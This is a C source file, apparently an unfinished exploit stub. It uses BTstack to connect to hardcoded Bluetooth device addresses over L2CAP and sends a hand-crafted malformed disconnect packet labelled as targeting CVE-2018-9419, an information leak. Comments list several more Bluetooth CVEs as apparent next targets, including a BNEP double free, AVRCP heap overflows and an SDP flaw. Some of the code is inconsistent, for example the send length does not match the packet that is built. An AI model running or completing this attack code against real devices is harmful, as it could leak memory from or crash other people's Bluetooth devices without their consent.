/**
 * SDP scan and connect to l2cap channels
 */

#define __BTSTACK_FILE__ "sdp_general_query.c"

#include "btstack_config.h"
#include "btstack_util.h"

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "l2cap.h"
#include "btstack.h"

int record_id = -1;
int attribute_id = -1;

static uint8_t   attribute_value[1000];
static const int attribute_value_buffer_size = sizeof(attribute_value);
static btstack_packet_callback_registration_t hci_event_callback_registration;

static void packet_handler (uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size);
static void handle_sdp_client_query_result(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size);

static void sdp_client_init(void){
    // init L2CAP
    l2cap_init();

    // register for HCI events
    hci_event_callback_registration.callback = &packet_handler;
    hci_add_event_handler(&hci_event_callback_registration);
}

static bd_addr_t remote = {0x98,0x01,0xA7,0x9D,0xC1,0x94};

static void l2cap_packet_handler(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size) {
    printf("[+] Got l2cap response");
    printf_hexdump(packet, size);
}

static void do_l2cap_connect() {
    uint8_t status = l2cap_create_channel(l2cap_packet_handler, remote, 3, l2cap_max_mtu(), NULL);
    printf("Status: %d\n", status);

    uint16_t pos = 0;
    l2cap_reserve_packet_buffer();
    uint8_t *buffer = l2cap_get_outgoing_buffer();

    // CVE-2018-9419 - Info leak via BLE?

    // cmd_code == L2CAP_CMD_DISC_REQ
    buffer[0] = 0x06;

    // id
    buffer[1] = 0x00;

    // cmd_len
    buffer[2] = 0x00;
    buffer[3] = 0x00;

    // CVE-2018-9356 - BNEP double free

    // CVE-2018-13281 - AVRCP heap overflow

    // CVE-2018-13266 - AVRCP 
    // CVE-2018-13267 - AVRCP 
    // CVE-2018-13281 - AVRCP 
    // CVE-2018-13282 - AVRCP 
    // CVE-2018-13283 - AVRCP 
    // CVE-2018-13291 - AVRCP 

    // CVE-2018-9478 - SDP

    // Some others from doc on other computer

    int err = l2cap_send_prepared(5, pos);
    printf("Error: %d\n", err);
}


static void packet_handler (uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size){
    UNUSED(channel);
    UNUSED(size);

    if (packet_type != HCI_EVENT_PACKET) return;
    uint8_t event = hci_event_packet_get_type(packet);

    switch (event) {
        case BTSTACK_EVENT_STATE:
            // BTstack activated, get started 
            if (btstack_event_state_get_state(packet) == HCI_STATE_WORKING){
                //sdp_client_query_uuid16(&handle_sdp_client_query_result, remote, BLUETOOTH_ATTRIBUTE_PUBLIC_BROWSE_ROOT);
                do_l2cap_connect();
            }
            break;
        default:
            break;
    }
}

static void assertBuffer(int size){
    if (size > attribute_value_buffer_size){
        printf("SDP attribute value buffer size exceeded: available %d, required %d", attribute_value_buffer_size, size);
    }
}

static void handle_sdp_client_query_result(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size){
    UNUSED(packet_type);
    UNUSED(channel);
    UNUSED(size);

    switch (packet[0]){
        case SDP_EVENT_QUERY_ATTRIBUTE_VALUE:
            // handle new record
            if (sdp_event_query_attribute_byte_get_record_id(packet) != record_id){
                record_id = sdp_event_query_attribute_byte_get_record_id(packet);
                printf("\n---\nRecord nr. %u\n", record_id);
            }

            assertBuffer(sdp_event_query_attribute_byte_get_attribute_length(packet));

            attribute_value[sdp_event_query_attribute_byte_get_data_offset(packet)] = sdp_event_query_attribute_byte_get_data(packet);
            if ((uint16_t)(sdp_event_query_attribute_byte_get_data_offset(packet)+1) == sdp_event_query_attribute_byte_get_attribute_length(packet)){
               printf("Attribute 0x%04x: ", sdp_event_query_attribute_byte_get_attribute_id(packet));
               de_dump_data_element(attribute_value);
            }
            break;
        case SDP_EVENT_QUERY_COMPLETE:
            if (sdp_event_query_complete_get_status(packet)){
                printf("SDP query failed 0x%02x\n", sdp_event_query_complete_get_status(packet));
                break;
            } 
            printf("SDP query done.\n");

            do_l2cap_connect();
            break;
    }
}

int btstack_main(int argc, const char * argv[]);
int btstack_main(int argc, const char * argv[]){
    (void)argc;
    (void)argv;

    //char *bdaddr = "98:01:A7:9D:C1:94";
    char *bdaddr = "D4:61:2E:12:67:7A";

    if (!sscanf_bd_addr(bdaddr, remote)) {
        printf("%s <bd addr>\n", argv[0]);
        exit(-1);
    }
    
    printf("Client HCI init done\r\n");
    
    sdp_client_init();

    // turn on!
    hci_power_control(HCI_POWER_ON);
            
    return 0;
}
